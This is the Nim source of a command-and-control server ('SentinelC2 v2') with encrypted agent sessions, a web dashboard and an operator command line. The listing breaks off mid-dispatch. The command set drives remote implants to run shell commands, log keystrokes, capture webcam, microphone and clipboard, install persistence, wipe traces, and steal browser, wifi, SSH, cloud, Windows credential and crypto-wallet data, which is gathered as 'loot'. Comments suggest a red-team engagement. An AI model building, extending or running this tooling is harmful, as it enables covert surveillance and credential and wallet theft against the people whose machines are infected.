# c2_server.nim — SentinelC2 Server (v2)
# Build:
#   nim c -d:release -d:ssl --threads:on --opt:speed c2_server.nim
#
# Changes from v1:
#   * Per-agent session keys derived after mutual HMAC auth
#   * Per-message AES-256-GCM with AAD (agent_id || direction) + counter nonce
#   * Reconnect-resistant: session key never leaves RAM; restarts force re-auth
#   * New commands: ps, clip, find, sleep, killdate, c2
#   * Upload (operator -> agent): operator pastes b64 chunks, server
#     stitches into per-agent upload buffer and finalises
#   * Auto-assemble for downloads: server writes received chunks to disk
#   * Monotonic command_id; server tags every command with one; agent
#     dedups on it
#   * Async CLI thread using --threads:on; alerts on stdin close but
#     keeps the listener alive
#   * Persistent session log (per-agent file in ./logs/)
#   * Command aliases (sh, dl, up, etc.)
#   * Build-time randomized prompt strings via BuildPrefix

import std/[asyncdispatch, asyncnet, asynchttpserver, nativesockets, json, os, times, random,
          base64, strutils, tables, locks, asyncfutures,
          sha1, monotimes, httpclient, uri, net]
import std/[algorithm]
import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael, sysrand]
import winim/lean

# The build script regenerates a fresh 16-byte xorkey.nim before each
# compile; there is no hardcoded fallback (a stale or wrong-length key
# fails the build instead of silently encoding garbage secrets).
include "xorkey.nim"
static:
  doAssert XorKey.len == 16,
    "xorkey.nim must define a 16-byte XorKey for c2_server builds"

proc encodeObf(s: string): seq[byte] =
  result = newSeq[byte](s.len)
  for i in 0..<s.len:
    result[i] = byte(ord(s[i])) xor XorKey[i mod 16]

proc obfDec(v: openArray[byte]): string =
  result = newString(v.len)
  for i in 0..<v.len: result[i] = chr(int(v[i] xor XorKey[i mod 16]))

when not defined(BuildPrefix):
  const BuildPrefix = "X7K"

const
  LISTEN_HOST = "0.0.0.0"
  LISTEN_PORT = 8443
  # Dashboard binds to loopback by default; expose it deliberately
  # with -d:web_bind_all (operators normally front it with a tunnel).
  WEB_HOST = when defined(web_bind_all): "0.0.0.0" else: "127.0.0.1"
  WEB_PORT = 8080
  # Dashboard WebSocket port (separate raw listener; asynchttpserver
  # is too aggressive about reusing HTTP/1.1 connections to safely
  # hijack a socket for WebSocket).
  WS_DASH_PORT = 8081
  SERVER_LOG = "server.log"
  # Web dashboard auth — Basic auth. Set your own per deployment.
  # To rotate: change these constants and rebuild.
  WEB_AUTH_USER = "operator"
  WEB_AUTH_PASSWORD = "S3nt1n3l-C2-D3v-Only-CHANGEME"
  S_SECRET = encodeObf("sentinel-engagement-q4-2026-echo-tango-whiskey")
  WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
  LOGS_DIR = "logs"
  UPLOADS_DIR = "uploads"
  DOWNLOADS_DIR = "downloads"

proc getSecret(): string =
  obfDec(S_SECRET)

when WEB_AUTH_PASSWORD == "S3nt1n3l-C2-D3v-Only-CHANGEME":
  {.warning: "OPSEC WARNING: Default web dashboard password is in use! Change WEB_AUTH_PASSWORD before production deployment.".}

const
  AAD_DIR_S2A = 0x00'u8
  AAD_DIR_A2S = 0x01'u8

# ------------------------------------------------------------
# CRYPTO
# ------------------------------------------------------------
type
  # Cached geo-IP result (forward decl so AgentSession can refer to it).
  GeoInfo = object
    country, region, city, isp, org, timezone: string
  AgentSession = ref object
    id, remoteAddr, hostname, osInfo, username, privileges: string
    connectedAt, lastBeacon: DateTime
    key: array[32, byte]
    peerNonce: array[16, byte]  # agent's nonce
    sendCtr: uint32
    lastCmdId: int64
    # Per-agent download assembler
    dlDir: string
    dlFiles: Table[string, tuple[f: File, total, got: int, lastIdx: int]]
    # Per-agent upload assembler
    upDir: string
    upFiles: Table[string, tuple[f: File, total, got: int]]
    # Out-of-band command queue (we send to agent on the next tick)
    cmdQueue: seq[JsonNode]
    # Cached geo-IP result for remoteAddr (populated async after connect)
    geo: GeoInfo

var agents = initTable[string, AgentSession]()
var agentsLock: Lock

# Forward declarations — defined further down but referenced from
# logLine (which is itself defined above the WS section).
proc sendWsFrame(sock: AsyncSocket, data: seq[byte]): Future[void] {.async.}
proc recvWsFrame(sock: AsyncSocket): Future[seq[byte]] {.async.}

# Operator WebSocket subscribers: per-agent list of browser sockets
# that want real-time log push. The dashboard JS opens a WS to
# /ws/log?agent=<id>; the server adds the socket here, and logLine
# pushes new lines to all subscribers of that agent.
var logSubs: Table[string, seq[AsyncSocket]] = initTable[string, seq[AsyncSocket]]()
var logSubsLock: Lock

# Per-agent "loot" store — accumulated loot events from auto-drive
# discovery. The dashboard fetches them via /api/loot/<id> and the
# server pushes new entries via the log WS channel (they ride along
# with regular log lines so the operator sees them stream in live).
type Loot = object
  kind, path, short, label: string
  size: int
  mtime: int64
  preview: string
  seen: Time
var lootStore: Table[string, seq[Loot]] = initTable[string, seq[Loot]]()
var lootStoreLock: Lock

# ------------------------------------------------------------
# GEO-IP ENRICHMENT
# ------------------------------------------------------------
# Operator-facing enrichment for agent source IPs. We hit ip-api.com
# (free, no key, HTTP, 45 req/min rate limit) and cache each result
# by IP. Lookup is fire-and-forget on agent connect; failures fall
# back to the raw IP. We deliberately use the synchronous-ish
# asynchttpclient from stdlib rather than building a raw HTTP
# request because we already have asyncdispatch in scope.
# (GeoInfo type is declared above so AgentSession can use it.)
var geoCache: Table[string, GeoInfo] = initTable[string, GeoInfo]()
var geoCacheLock: Lock
const GEO_TTL_SECS = 3600  # 1 hour

proc ipKey(ip: string): string =
  # Normalise to bare IP. ip-api doesn't handle ports / IPv6 zones
  # in the path. Strip brackets around IPv6 if present.
  var s = ip
  if s.startsWith("["):
    let r = s.find(']')
    if r > 0: s = s[1..<r]
  return s

proc lookupGeo(ip: string): Future[GeoInfo] {.async, gcsafe.} =
  # Return cached entry if fresh, else hit ip-api.com and cache.
  # If lookup fails, return a GeoInfo with country="?" and don't
  # poison the cache (so transient errors auto-retry).
  #
  # OPT-IN: geo lookups send every agent's public IP to a third
  # party (ip-api.com) over cleartext HTTP. That is an OPSEC leak by
  # default, so the lookup only happens when the server is built
  # with -d:geo_lookup. Without it, agents show country="local".
  when not defined(geo_lookup):
    if ip.len == 0:
      return GeoInfo(country: "?")
    let keyOff = ipKey(ip)
    let priv = GeoInfo(country: "local")
    {.cast(gcsafe).}:
      acquire(geoCacheLock)
      geoCache[keyOff] = priv
      release(geoCacheLock)
    result = priv
  else:
    if ip.len == 0:
      return GeoInfo(country: "?")
    let key = ipKey(ip)
    # Cache hit?
    var cached: GeoInfo
    var hit = false
    {.cast(gcsafe).}:
      acquire(geoCacheLock)
      if key in geoCache:
        cached = geoCache[key]
        hit = true
      release(geoCacheLock)
    if hit:
      return cached
    # Skip private / loopback / link-local — no useful geo data and
    # ip-api will refuse them anyway.
    if key == "127.0.0.1" or key.startsWith("192.168.") or
       key.startsWith("10.") or key.startsWith("172.16.") or
       key.startsWith("172.17.") or key.startsWith("172.18.") or
       key.startsWith("172.19.") or key.startsWith("172.2") or
       key.startsWith("172.30.") or key.startsWith("172.31.") or
       key == "::1" or key.startsWith("fe80:"):
      let priv = GeoInfo(country: "private")
      {.cast(gcsafe).}:
        acquire(geoCacheLock)
        geoCache[key] = priv
        release(geoCacheLock)
      return priv
    try:
      # ip-api.com HTTP endpoint. httpclient.get is blocking, so we
      # run it in a worker thread and bridge back to the async
      # dispatcher via a Future. createThread requires a {.nimcall.}
      # proc that can't capture closures, so we pass the IP and
      # result-future through a ref object as the thread argument.
      type GeoJob = ref object
        ip: string
        fut: Future[GeoInfo]
      let job = GeoJob(ip: key, fut: newFuture[GeoInfo]("geoip"))
      proc worker(j: GeoJob) {.thread, nimcall.} =
        try:
          let client = newHttpClient(timeout = 5000)
          let url = "http://ip-api.com/json/" & j.ip & "?fields=status,country,regionName,city,isp,org,timezone,query"
          let body = client.getContent(url)
          let parsed = parseJson(body)
          if parsed["status"].getStr("") == "success":
            let g = GeoInfo(
              country: parsed["country"].getStr("?"),
              region: parsed["regionName"].getStr("?"),
              city: parsed["city"].getStr("?"),
              isp: parsed["isp"].getStr("?"),
              org: parsed["org"].getStr("?"),
              timezone: parsed["timezone"].getStr("?")
            )
            j.fut.complete(g)
          else:
            j.fut.complete(GeoInfo(country: "?"))
        except:
          try: j.fut.complete(GeoInfo(country: "?"))
          except: discard
      var t: Thread[GeoJob]
      createThread(t, worker, job)
      let g = await job.fut
      # Only cache real results; failure case ("?") we don't cache so
      # a subsequent reconnect can re-attempt.
      if g.country != "?":
        {.cast(gcsafe).}:
          acquire(geoCacheLock)
          geoCache[key] = g
          release(geoCacheLock)
      return g
    except:
      return GeoInfo(country: "?")

# Build a JSON object containing the remote address + resolved geo
# fields, suitable for inclusion in agent list / state responses.
# Caller may be gcsafe or not; this proc itself touches only locals
# and stdlib json (which is GC-managed but the call sites already
# run outside the agentsLock).
proc geoJson(remoteAddr: string, g: GeoInfo): JsonNode =
  result = %* {
    "addr": remoteAddr,
    "country": g.country,
    "region": g.region,
    "city": g.city,
    "isp": g.isp,
    "org": g.org,
    "timezone": g.timezone
  }

# ------------------------------------------------------------
# CRYPTO (matching agent v2)
# ------------------------------------------------------------
proc deriveSessionKey(secret: string,
                      ourNonce, peerNonce: openArray[byte]): array[32, byte] =
  var ctx: HMAC[sha256]
  ctx.init(secret)
  ctx.update(ourNonce)
  ctx.update(peerNonce)
  let d = ctx.finish()
  for i in 0..<32: result[i] = d.data[i]
  ctx.clear()

proc makeNonce(ctr: uint32, randBytes: openArray[byte]): array[12, byte] =
  result[0] = byte((ctr shr 24) and 0xFF)
  result[1] = byte((ctr shr 16) and 0xFF)
  result[2] = byte((ctr shr 8) and 0xFF)
  result[3] = byte(ctr and 0xFF)
  for i in 0..<8: result[4 + i] = randBytes[i]

proc makeAad(agentId: string, dir: byte): seq[byte] =
  result = newSeqOfCap[byte](agentId.len + 1)
  for c in agentId: result.add(byte(c))
  result.add(dir)

proc encryptFrame(s: AgentSession, plain: string): seq[byte] =
  var randBytes: array[8, byte]
  discard randomBytes(addr randBytes[0], 8)
  let nonce = makeNonce(s.sendCtr, randBytes)
  inc s.sendCtr
  let aad = makeAad(s.id, AAD_DIR_S2A)
  var ctx: GCM[aes256]
  ctx.init(s.key, nonce, aad)
  let pt = cast[seq[byte]](plain)
  var ct = newSeq[byte](pt.len)
  ctx.encrypt(pt, ct)
  let tag = ctx.getTag()
  result = newSeqOfCap[byte](12 + ct.len + 16)
  for b in nonce: result.add(b)
  for b in ct: result.add(b)
  for b in tag: result.add(b)

proc decryptFrame(s: AgentSession, blob: openArray[byte]): string =
  if blob.len < 28: return ""
  var nonce: array[12, byte]
  for i in 0..<12: nonce[i] = blob[i]
  let ctLen = blob.len - 12 - 16
  if ctLen < 0: return ""
  let ct = blob[12 ..< 12 + ctLen]
  let tag = blob[blob.len - 16 ..< blob.len]
  let aad = makeAad(s.id, AAD_DIR_A2S)
  var ctx: GCM[aes256]
  ctx.init(s.key, nonce, aad)
  var pt = newSeq[byte](ct.len)
  if not ctx.decrypt(ct, pt, tag): return ""
  result = cast[string](pt)

proc hmacHex(secret, data: string): string =
  toHex(sha256.hmac(secret, data).data)

proc bytesToHex(b: openArray[byte]): string =
  result = newString(b.len * 2)
  for i in 0..<b.len:
    result[i*2]   = "0123456789abcdef"[(b[i] shr 4) and 0xF]
    result[i*2+1] = "0123456789abcdef"[b[i] and 0xF]

# ------------------------------------------------------------
# SESSION LOG (per-agent)
# ------------------------------------------------------------
proc logPath(agentId: string): string =
  createDir(LOGS_DIR)
  result = LOGS_DIR / (agentId & ".log")

proc logLine(agentId, line: string) =
  let ts = now().format("yyyy-MM-dd HH:mm:ss")
  let formatted = "[" & ts & "] " & line
  try:
    let f = open(logPath(agentId), fmAppend)
    defer: f.close()
    f.writeLine(formatted)
  except:
    # last-resort fallback: write to server.log
    try:
      let f = open(SERVER_LOG, fmAppend)
      defer: f.close()
      f.writeLine("[" & ts & "] log-fail: " & getCurrentExceptionMsg())
    except: discard
  # Push to live operator subscribers. Snapshot the list under the
  # lock; each send is fire-and-forget so a slow/dead subscriber
  # can't block the log line. Stale subscribers are cleaned up by
  # the WS handler when its recv fails.
  var subs: seq[AsyncSocket] = @[]
  acquire(logSubsLock)
  if agentId in logSubs:
    subs = logSubs[agentId]
  release(logSubsLock)
  if subs.len > 0:
    let payload = cast[seq[byte]]($ %* {
      "type": "log",
      "agent": agentId,
      "ts": ts,
      "line": line
    })
    for sock in subs:
      try:
        asyncCheck sock.sendWsFrame(payload)
      except: discard

# Server-level log: exception traces, web access, X25519 lifecycle.
# Use this for anything that doesn't fit per-agent logs.
proc serverLog(line: string) =
  try:
    let f = open(SERVER_LOG, fmAppend)
    defer: f.close()
    let ts = now().format("yyyy-MM-dd HH:mm:ss")
    f.writeLine("[" & ts & "] " & line)
  except: discard

# ------------------------------------------------------------
# WEBSOCKET FRAMING (manual; same as v1)
# ------------------------------------------------------------
proc sendWsFrame(sock: AsyncSocket, data: seq[byte]) {.async.} =
  var frame = @[0x81.byte]
  let L = data.len
  if L < 126:
    frame.add(L.byte)
  elif L < 65536:
    frame.add(126.byte)
    let ext: array[2, byte] = [byte((L shr 8) and 0xFF), byte(L and 0xFF)]
    frame.add(ext)
  else:
    frame.add(127.byte)
    var be: array[8, byte]
    for i in 0..<8:
      be[i] = byte((L shr (56 - i*8)) and 0xFF)
    frame.add(be)
  frame.add(data)
  await sock.send(cast[string](frame))

const MAX_WS_FRAME_BYTES = 64 * 1024 * 1024

proc recvWsFrame(sock: AsyncSocket): Future[seq[byte]] {.async.} =
  var hdr: array[2, byte]
  let n1 = await sock.recvInto(addr hdr[0], 2)
  if n1 != 2: return @[]
  let op = hdr[0] and 0x0F
  let masked = (hdr[1] and 0x80) != 0
  var L = int(hdr[1] and 0x7F)
  if L == 126:
    var ext: array[2, byte]
    let n2 = await sock.recvInto(addr ext[0], 2)
    if n2 != 2: return @[]
    L = (int(ext[0]) shl 8) or int(ext[1])
  elif L == 127:
    var ext: array[8, byte]
    let n3 = await sock.recvInto(addr ext[0], 8)
    if n3 != 8: return @[]
    # Refuse anything >= 2^56 before the shift arithmetic can wrap
    # the sign bit — attacker-supplied lengths must never drive
    # allocation sizing.
    if ext[0] != 0:
      return @[]
    L = 0
    for i in 1..<8: L = (L shl 8) or int(ext[i])
  if L < 0 or L > MAX_WS_FRAME_BYTES:
    return @[]
  var mask: array[4, byte]
  if masked:
    let n4 = await sock.recvInto(addr mask[0], 4)
    if n4 != 4: return @[]
  var payload = newSeq[byte](L)
  var off = 0
  while off < L:
    let r = await sock.recvInto(addr payload[off], L - off)
    if r <= 0: return @[]
    off += r
  if masked:
    for i in 0..<L: payload[i] = payload[i] xor mask[i mod 4]
  if op == 0x8: return @[]
  if op == 0x9:
    await sendWsFrame(sock, @[0x8A.byte])
    return @[]
  result = payload

proc wsUpgrade(client: AsyncSocket): Future[bool] {.async.} =
  var buf = ""
  while true:
    var ch: array[1, byte]
    let n = await client.recvInto(addr ch[0], 1)
    if n != 1: return false
    buf.add(char(ch[0]))
    if buf.len > 8192: return false
    if buf.endsWith("\r\n\r\n"): break
  var key = ""
  for line in buf.split("\r\n")[1..^1]:
    let p = line.split(": ", 1)
    if p.len == 2 and p[0].toLowerAscii == "sec-websocket-key":
      key = p[1].strip
  if key.len == 0: return false
  var sha1ctx = newSha1State()
  sha1ctx.update(key & WS_GUID)
  let digest = finalize(sha1ctx)
  var bs: seq[byte] = @[]
  for b in digest: bs.add(byte(b))
  let accept = base64.encode(bs)
  await client.send("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " & accept & "\r\n\r\n")
  true

# Fire-and-forget wrapper used by background pushes (e.g. agent
# list updates). Catches every error including OSError so an
# aborted client socket can never become an unhandled exception.
proc sendWsFrameSafe(sock: AsyncSocket, data: seq[byte]) {.async, gcsafe.} =
  try:
    await sock.sendWsFrame(data)
  except:
    # Best-effort: drop silently. Caller is asyncCheck'd and must
    # never propagate failures to the dispatcher.
    discard

# ------------------------------------------------------------
# DOWNLOAD ASSEMBLY (server-side)
# ------------------------------------------------------------
proc ensureAgentDirs(s: AgentSession) =
  if s.dlDir.len == 0:
    s.dlDir = DOWNLOADS_DIR / s.id
    createDir(s.dlDir)
  if s.upDir.len == 0:
    s.upDir = UPLOADS_DIR / s.id
    createDir(s.upDir)

proc openDownloadFile(s: AgentSession, path: string, total: int): File =
  ensureAgentDirs(s)
  # Sanitize: keep only the basename to prevent path traversal
  let name = path.extractFilename
  if name.len == 0: return nil
  let fullPath = s.dlDir / name
  result = open(fullPath, fmWrite)
  logLine(s.id, "[download] " & fullPath & " (" & $total & " chunks)")

proc handleFileChunk(s: AgentSession, m: JsonNode) =
  let path = m["filepath"].getStr("")
  let idx = m["chunk_index"].getInt(0)
  let total = m["total_chunks"].getInt(0)
  let lastChunk = m["last_chunk"].getBool(false)
  let dataB64 = m["data"].getStr("")
  let data = base64.decode(dataB64)
  if not s.dlFiles.hasKey(path):
    let f = openDownloadFile(s, path, total)
    if f == nil: return
    s.dlFiles[path] = (f, total, 0, -1)
  var entry = s.dlFiles[path]
  if entry.lastIdx == idx:
    return  # duplicate
  discard writeBuffer(entry.f, addr data[0], data.len)
  inc entry.got
  entry.lastIdx = idx
  s.dlFiles[path] = entry
  if lastChunk or entry.got >= entry.total:
    entry.f.close()
    s.dlFiles.del(path)
    logLine(s.id, "[download] done: " & path)
    echo "[" & BuildPrefix & " +] ", s.id, " -> ", path

# Forward declarations (defined later, after the web/dashboard section)
proc pushAgentsUpdate() {.gcsafe.}

# ------------------------------------------------------------
# AGENT HANDLER
# ------------------------------------------------------------
# Unauthenticated clients can drive allocation sizing through frame
# length. Cap pre-auth frames well below the post-auth 64 MB limit —
# a legitimate registration message is a few KB at most.
const MAX_PREAUTH_FRAME_BYTES = 64 * 1024

proc handleAgent(client: AsyncSocket) {.async.} =
  if not await wsUpgrade(client): client.close(); return
  var agentId = ""
  let done = newFuture[void]("agent_done")

  try:
    let raw = await client.recvWsFrame()
    if raw.len == 0: client.close(); return
    if raw.len > MAX_PREAUTH_FRAME_BYTES: client.close(); return

    # First frame is registration: NOT encrypted yet (we need to derive
    # the session key first). We expect {p, h, an} in plaintext.
    let ptext = cast[string](raw)
    let regMsg = parseJson(ptext)
    let payload = regMsg["p"].getStr("")
    let agentHmac = regMsg["h"].getStr("")
    let anB64 = (if regMsg.hasKey("an"): regMsg["an"].getStr() else: "")
    if anB64.len == 0:
      await client.sendWsFrame(cast[seq[byte]](
        "{\"status\":\"rejected\",\"reason\":\"no_nonce\"}"))
      client.close(); return
    if hmacHex(getSecret(), payload) != agentHmac:
      await client.sendWsFrame(cast[seq[byte]](
        "{\"status\":\"rejected\",\"reason\":\"bad_hmac\"}"))
      client.close(); return

    # Parse the agent's nonce + info — nonce comes from the "an" field
    let infoJson = payload
    let ourAgentNonce = base64.decode(anB64)
    if ourAgentNonce.len != 16:
      client.close(); return

    # Generate server nonce, derive session key. CSPRNG required:
    # this nonce is mixed into the per-agent session key, so a
    # predictable MT19937 stream would weaken every session.
    var sn: array[16, byte]
    discard randomBytes(addr sn[0], 16)
    let snHex = bytesToHex(sn)

    agentId = $rand(100000..999999) & $rand(100000..999999)
    let info = parseJson(infoJson)

    # Send registration ack (still in plaintext) with server nonce
    let ack = $ %* {"status": "registered", "agent_id": agentId, "sn": snHex}
    await client.sendWsFrame(cast[seq[byte]](ack))

    # Create session
    let session = AgentSession(
      id: agentId, remoteAddr: client.getPeerAddr()[0],
      connectedAt: now(), lastBeacon: now(),
      hostname: info["h"].getStr("?"), osInfo: info["o"].getStr("?"),
      username: info["u"].getStr("?"), privileges: info["p"].getStr("?")
    )
    # Session key: server's view is (server_nonce || agent_nonce)
    for i in 0..<16: session.peerNonce[i] = ourAgentNonce[i].byte
    session.key = deriveSessionKey(getSecret(), sn, cast[seq[byte]](ourAgentNonce))

    withLock agentsLock: agents[agentId] = session
    pushAgentsUpdate()  # notify operator dashboards of new agent
    # Fire off async geo-IP lookup; on completion, store the result
    # on the session and push again so the dashboard updates.
    proc enrichGeo() {.async, gcsafe.} =
      let g = await lookupGeo(session.remoteAddr)
      {.cast(gcsafe).}:
        withLock agentsLock:
          if agentId in agents:
            agents[agentId].geo = g
      pushAgentsUpdate()
    asyncCheck enrichGeo()
    echo "[" & BuildPrefix & " +] ", agentId, " registered: ",
         session.hostname, " | ", session.username
    logLine(agentId, "[connect] " & session.hostname & " " &
            session.username & " (" & session.privileges & ")")

    proc sender() {.async.} =
      # Single-owner dequeue loop. The previous design asyncCheck'd a
      # poll task per 15s idle cycle; those tasks were never cancelled
      # and each zombie stole the next queued command into a dead
      # future. One loop, one deadline, no stragglers.
      var deadline = now() + initDuration(seconds = 15)
      while true:
        var cmd: JsonNode = nil
        {.cast(gcsafe).}:
          withLock agentsLock:
            if session.cmdQueue.len > 0:
              cmd = session.cmdQueue[0]
              session.cmdQueue.delete(0)
        if cmd != nil:
          try:
            await client.sendWsFrame(encryptFrame(session, $cmd))
            session.lastBeacon = now()
            logLine(session.id, "[>] " & $cmd)
          except: break
          deadline = now() + initDuration(seconds = 15)
        elif now() >= deadline:
          try:
            # Idle ping (encrypted with session key)
            await client.sendWsFrame(encryptFrame(session,
              $ %* {"cmd": "ping"}))
          except: break
          deadline = now() + initDuration(seconds = 15)
        else:
          await sleepAsync(100)

    proc receiver() {.async.} =
      while true:
        let frame = await client.recvWsFrame()
        if frame.len == 0: break
        let d = decryptFrame(session, frame)
        if d.len == 0: continue
        let m = parseJson(d)
        case m["type"].getStr("")
        of "output":
          let txt = m["data"].getStr("")
          # Always write full to per-agent log so it doesn't interrupt
          # the operator's CLI input. Print a short status to console.
          logLine(session.id, "[<] " & txt)
          let lines = txt.splitLines.len
          let firstLine = (if txt.splitLines.len > 0: txt.splitLines[0] else: "")
          let brief = (if lines <= 1 and firstLine.len < 100: firstLine
                       else: firstLine[0..<min(80, firstLine.len)] & " (" & $lines & " lines, see logs/" & session.id & ".log)")
          echo "[" & BuildPrefix & " <] ", session.id, ": ", brief
        of "file_chunk":
          handleFileChunk(session, m)
        of "ps":
          # Process list dump — log the full table, only print a one-liner
          # to console so it doesn't corrupt the input line.
          let nrows = m.getOrDefault("rows").len
          var full = "ps (" & $nrows & " rows):\n"
          for r in m.getOrDefault("rows"):
            full.add("  pid=" & $r["pid"].getInt() & " ppid=" & $r["ppid"].getInt() &
                     " name=" & r["name"].getStr() & "\n")
          logLine(session.id, full)
          echo "[" & BuildPrefix & " <] ", session.id, " : ps (", nrows, " rows, see logs/", session.id, ".log)"
        of "find":
          # Find results — log full, print only count to console.
          let nrows = m.getOrDefault("count").getInt(0)
          var full = "find (" & $nrows & " matches):\n"
          for r in m.getOrDefault("rows"):
            full.add("  " & r["path"].getStr() & " (" & $r["size"].getInt() & " bytes)\n")
          logLine(session.id, full)
          echo "[" & BuildPrefix & " <] ", session.id, " : find (", nrows, " matches, see logs/", session.id, ".log)"
        of "heartbeat":
          # Silent — only used to keep the session alive.
          session.lastBeacon = now()
        of "loot":
          # Auto-drive discovery event. Store + log it so the operator
          # sees it stream in on the dashboard log panel AND appears
          # in the dedicated loot panel via /api/loot/<id>.
          let kind = m.getOrDefault("kind").getStr("?")
          let path = m.getOrDefault("path").getStr("?")
          let short = m.getOrDefault("short").getStr(path)
          let label = m.getOrDefault("label").getStr(short)
          let sz = m.getOrDefault("size").getInt(0)
          let mt = m.getOrDefault("mtime").getInt(0)
          let prev = m.getOrDefault("preview").getStr("")
          let entry = Loot(kind: kind, path: path, short: short,
                           label: label, size: sz, mtime: mt,
                           preview: prev, seen: getTime())
          {.cast(gcsafe).}:
            withLock lootStoreLock:
              if not lootStore.hasKey(session.id):
                lootStore[session.id] = @[]
              lootStore[session.id].add(entry)
            logLine(session.id, "[loot] " & kind & ": " & label &
                    " (" & $sz & "B) -> " & path)
            # Push via the log WS to dashboard subscribers (same
            # channel as regular log lines) for instant feedback.
            let push = $ %* {"type": "loot",
              "agent": session.id, "kind": kind, "path": path,
              "short": short, "label": label, "size": sz,
              "mtime": mt, "preview": prev}
            if logSubs.hasKey(session.id):
              for s in logSubs[session.id]:
                asyncCheck sendWsFrameSafe(s, cast[seq[byte]](push))
        else: discard
      done.complete()

    asyncCheck sender()
    asyncCheck receiver()
    await done
  except:
    serverLog("agent handler exception for " & agentId & ": " & getCurrentExceptionMsg())

  withLock agentsLock: agents.del(agentId)
  pushAgentsUpdate()  # notify operator dashboards
  logLine(agentId, "[disconnect]")
  echo "[" & BuildPrefix & " -] ", agentId, " disconnected"
  client.close()

# ------------------------------------------------------------
# CLI (async, with aliases + command_id)
# ------------------------------------------------------------
var cliCh: Channel[string]
var nextCmdId: int64 = 0

proc age(s: AgentSession): string =
  let secs = (now() - s.connectedAt).inSeconds
  result = intToStr(secs div 3600, 2) & ":" &
           intToStr((secs mod 3600) div 60, 2) & ":" &
           intToStr(secs mod 60, 2)

proc cliThread() {.thread.} =
  while true:
    try:
      stdout.write BuildPrefix & "> "; stdout.flushFile()
      cliCh.send(stdin.readLine())
    except IOError, OSError, ValueError:
      stdout.write "\r\n[" & BuildPrefix & " !] stdin closed, CLI offline.\r\n"
      stdout.flushFile()
      cliCh.send("__stdin_closed__")
      break

proc helpText(): string =
  result = "Commands:\n" &
           "  list                           - list connected agents\n" &
           "  help                           - this text\n" &
           "  shell/sh <id> <cmd>            - run shell command\n" &
           "  download/dl <id> <path>        - download file from agent\n" &
           "  upload/up <id> <remotepath> <base64>\n" &
           "  screenshot/ss <id>             - take screenshot\n" &
           "  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp\n" &
           "  clipwatch <id> [seconds]       - start continuous clipboard monitor (default 1.5s, range 0.5..30) -> downloads/clip_<ts>_<n>.txt\n" &
           "  unclipwatch <id>               - stop clipboard monitor and report capture count\n" &
           "  mic/m <id> [seconds]          - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav\n" &
           "  listen <id>                   - start live mic stream -> downloads/mic_live_<ts>.wav (ffplay -infbuf)\n" &
           "  unlisten <id>                 - stop live mic stream and finalize file\n" &
           "  ps <id>                        - list processes on agent\n" &
           "  clip <id>                      - get clipboard\n" &
           "  find <id> <path>;<mask>        - find files\n" &
           "  keys/k <id> {start|stop}       - keylogger control\n" &
           "  persist/p <id>                 - re-establish persistence\n" &
           "  exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds\n" &
           "  recon <id> <kind>              - edr|shares|software|usb|tasks\n" &
           "  killdate <id> <unix_ts>        - set kill date (0 = clear)\n" &
           "  sleep <id> <minutes>           - set sleep between reconnects\n" &
           "  tg <id>                        - telegram-test ping\n" &
           "  kill/x <id>                    - uninstall and quit\n" &
           "  panic <id>                     - emergency self-destruct (wipes all traces)\n" &
           "  quit                           - exit server\n"

proc buildCmd(cmd: string, args: string = ""): JsonNode =
  inc nextCmdId
  result = %* {"cmd": cmd, "args": args, "cid": nextCmdId}

# Build a command with extra fields (used by upload — needs `path` and
# `data` in addition to `cmd` and `args`). The agent's `upload` handler
# reads `path` as the remote destination and `data` as the b64 chunk.
proc buildCmdExt(cmd: string, args: string, extra: JsonNode): JsonNode =
  inc nextCmdId
  result = %* {"cmd": cmd, "args": args, "cid": nextCmdId}
  for k, v in extra.pairs:
    result[k] = v

proc dispatch(line: string): string =
  let p = line.strip.split(" ", maxsplit=2)
  if p.len == 0: return ""
  case p[0]
  of "quit", "exit", "q": quit(0)
  of "help", "?": return helpText()
  of "list", "ls":
    withLock agentsLock:
      if agents.len == 0: return "No agents."
      result = "ID\t\tHost\t\tUser\t\tOS\t\tUptime\n"
      for id, a in agents.pairs:
        result.add(id & "\t" & a.hostname & "\t" & a.username & "\t" &
                   a.osInfo & "\t" & a.age() & "\n")
  of "shell", "sh", "download", "dl", "screenshot", "ss", "cam",
     "ps", "clip", "find", "keys", "k", "persist", "p", "killdate",
     "sleep", "kill", "x", "exfil", "recon", "tg", "panic",
     "mic", "m", "listen", "unlisten",
     "clipwatch", "unclipwatch":
    if p.len < 2: return "Usage: " & p[0] & " <id> [args]\n"
    let cmd = block:
      var c = p[0]
      case c
      of "sh": "shell"
      of "dl": "download"
      of "ss": "screenshot"
      of "k": "keys"
      of "p": "persist"
      of "x": "kill"
      of "m": "mic"
      else: c
    if cmd == "screenshot" or cmd == "persist" or cmd == "kill" or
       cmd == "panic" or
       cmd == "ps" or cmd == "clip" or cmd == "tg" or
       cmd == "listen" or cmd == "unlisten":
      if p.len < 2: return "Usage: " & p[0] & " <id>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "exfil" or cmd == "recon":
      # exfil/recon take a kind: browser|wifi|cloud|ssh|media|wallet|recent|wincreds
      #                       and: edr|shares|software|usb|tasks
      if p.len < 3: return "Usage: " & p[0] & " <id> <kind>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd, p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "keys":
      if p.len < 3: return "Usage: " & p[0] & " <id> {start|stop}\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("keys", p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "killdate" or cmd == "sleep":
      if p.len < 3: return "Usage: " & p[0] & " <id> <value>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd, p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "mic":
